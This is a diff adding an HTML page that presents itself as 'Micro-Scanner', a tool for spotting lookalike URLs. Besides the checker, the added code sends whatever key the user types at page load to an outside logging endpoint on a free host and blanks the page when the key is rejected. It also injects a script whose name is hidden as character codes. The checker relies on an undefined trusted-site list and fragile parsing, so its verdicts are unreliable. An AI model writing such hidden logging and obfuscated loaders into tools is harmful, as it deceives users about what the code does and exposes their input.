@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+ <head> 
+<script>
+    /*
+How It Works
+Upon pasting a URL into the input field and clicking the "Check" button, Micro-Scanner processes the input and performs the following steps:
+
+Input URLs: "marvel.com" (genuine) and "marval.com" (insecure).
+Domain Extraction: Extracts domain names: "marvel.com" and "marval.com".
+Domain Comparison: Compares with trusted list:
+"marvel.com" matches trusted sites.
+"marval.com" doesn't match.
+Result Display:
+"marvel.com": Confirms genuine.
+"marval.com": Warns of insecurity.
+Additionally, it shows a visual indicator, such as an image, to highlight the insecure status for "marval.com".
+User Action:
+Proceed with "marvel.com".
+Caution with "marval.com".
+By following these steps, the Micro-Scanner tool helps users quickly assess the security status of URLs and make safer browsing decisions.
+*/
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {
+    color: white;
+    text-align: center;
+    font-family: Verdana, Geneva, Tahoma, sans-serif;
+    background-color: black;
+}
+
+@media screen and (min-width: 768px) {
+    body {
+        background-image: url("https://wallpapershome.com/images/pages/pic_h/25899.jpeg");
+        background-repeat: no-repeat;
+        background-size: cover;
+    }
+}
+
+input[type="text"] {
+    border-radius: 15px;
+    width: 80%;
+    margin-top: 5%;
+    background-color: transparent;
+    color: white;
+    border: 2px solid white;
+    padding: 10px;
+}
+
+button {
+    width: fit-content;
+    border-radius: 10px;
+    margin-top: 10px;
+    padding: 10px 20px;
+    background-color: #3498db;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #2980b9;
+}
+</style>
+</head>
+<body>
+
+<h1>Micro-Scanner</h1>
+
+<input id="inp" type="text" placeholder="Paste the URL">
+<br>
+<button onclick="x()">Check</button>
+<p id="a2"></p>
+<p id="a1" style="color: red;"></p>
+<br><br>
+<div id="p"></div>
+
+<script type="text/javascript">
+    function x(){
+        let out=document.getElementById('p');
+        let ip=document.getElementById('inp').value;
+        let fal=1;
+        
+        ip=ip.replace("https://"," ");
+        ip=ip.replace("www."," ");
+        let ind=ip.indexOf('/');
+        i=ip.substring(0,ind);
+        i=i.replace(" ","");
+        i=i.replace(" ","");
+        
+        for(let da in pred){
+            let t=pred[da]==i;
+            if(t){
+                window.alert("This website is genuine, you can go ahead");
+                window.open(`https://www.${pred[da]}`,"_self");
+                fal="";
+                break;
+            } else {
+                fal=1;
+            }
+        }
+        
+        if(fal==1){
+            document.getElementById("a2").innerHTML="<img src='https://github.com/nikhil2005858/microdisk/blob/main/i1-removebg-preview.png?raw=true' width='fit-content' height='75'>";
+            document.getElementById("a1").innerHTML="This website is insecure";
+        }
+    }
+    
+    async function fku(){
+    let xxxx=document.body.innerHTML;
+     let xx=await fetch("https://microintel.000webhostapp.com/logfku.php?input="+prompt("    Enter U Key"));
+     let c=await xx.json();
+     let xxx= await c.status;
+     if(xxx){
+     alert(xxxx);
+     }
+     else{
+     document.write(2);
+     }
+    }
+    fku();
+</script>
+ <miheart src="dom.js"></miheart>
+<script type="text/javascript">
+const u =[100, 111, 109, 46, 106, 115];
+      
+      let xx = "";
+      for (let i = 0; i < u.length; i++) {const a = String.fromCharCode(u[i]);xx += a;}
+      const xxx = document.createElement('script');
+      xxx.src = xx;
+      document.body.appendChild(xxx);
+</script>
+</body>
+</html>
